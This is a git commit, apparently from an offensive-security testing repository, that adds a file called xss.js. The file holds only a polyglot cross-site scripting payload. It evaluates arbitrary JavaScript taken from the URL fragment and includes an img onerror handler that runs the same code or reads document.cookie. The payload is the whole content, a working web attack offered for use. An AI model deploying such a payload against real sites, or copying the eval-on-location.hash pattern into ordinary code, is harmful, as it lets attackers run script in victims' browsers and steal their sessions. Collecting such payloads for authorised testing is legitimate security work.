7811550227677daab56552850da059b4cee3552a
Pedro L.C.A <thezakman@icloud.com>
2021-03-18 12:19:55 -0300

    Create xss.js

---
+++ xss.js
@@ -0,0 +1,2 @@
+'';var msgbox;if(location.hash){eval(location.hash.slice(1))}else{alert(1)}//<img src="xxx://" onerror="if(location.hash){eval(location.hash.slice(1))}else{document.cookie}">
+msgbox+1
